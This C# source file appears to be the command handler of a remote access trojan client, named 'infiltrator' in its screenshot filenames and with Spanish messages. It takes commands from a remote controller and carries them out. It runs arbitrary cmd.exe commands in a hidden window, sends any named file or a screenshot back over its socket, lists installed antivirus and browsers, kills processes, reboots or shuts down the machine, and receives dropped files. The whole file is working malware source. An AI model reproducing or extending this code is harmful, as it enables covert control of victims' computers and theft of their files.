using Client.Conexion;
using Client.Util;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Commands
{
    static class HandleCommands
    {

        public static string ExecuteCommand(string command) {

            ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
            processInfo.RedirectStandardOutput = true;
            processInfo.UseShellExecute = false;
            processInfo.CreateNoWindow = true;

            Process process = new Process();
            process.StartInfo = processInfo;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }

        public static async Task<string> ProcessCommandAsync(string command)
        {
            string response = "";

            if (command.StartsWith("exec"))
            {
                response = HandleCommands.ExecuteCommand(command.Substring(5));
            }
            else if (command == "list_processes")
            {
                response = Functions.ListProcesses();
            }
            else if (command.StartsWith("get "))
            {
                string fileName = command.Substring(4).Trim();
                response = "";
                ClientSocket.SendFile(fileName);
            }
            else if (command == "browsers")
            {
                response = Functions.ListInstalledBrowsers();
            }
            else if (command == "reboot")
            {
                response = HandleCommands.ExecuteCommand("shutdown /r /t 10");
            }
            else if (command == "shutdown")
            {
                response = HandleCommands.ExecuteCommand("shutdown /s");
            }
            else if (command == "antivirus")
            {
                response = Functions.ListInstalledAntivirus();
            }
            else if (command == "network_info")
            {
                response = await SystemInfo.GetNetworkInfo();
            }
            else if (command == "system_info")
            {
                response = SystemInfo.GetSystemInfo();
            }
            else if (command == "screenshot")
            {
                string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                string filename = $"infiltrator-{timestamp}-screenshot.png";
                Screenshot.CaptureScreen(filename);
                ClientSocket.SendFile(filename);
                File.Delete(filename);
                response = "";
            }
            else if (command == "disconnect")
            {
                response = "";
                ClientSocket.setConnected(false);
            }
            else if (command.StartsWith("kill "))
            {
                int pid;
                if (int.TryParse(command.Substring(5), out pid))
                {
                    response = Functions.KillProcess(pid);
                }
                else
                {
                    response = "Formato de comando 'kill' incorrecto. Uso: kill PID";
                }
            }
            else if (command.StartsWith("sendfile "))
            {
                string fileName = command.Substring(9).Trim();
                ClientSocket.ReceiveFile(fileName);
                response = $"Archivo {fileName} recibido correctamente.";
            }
            else
            {
                response = "Comando no reconocido.";
            }

            return response;
        }


    }
}
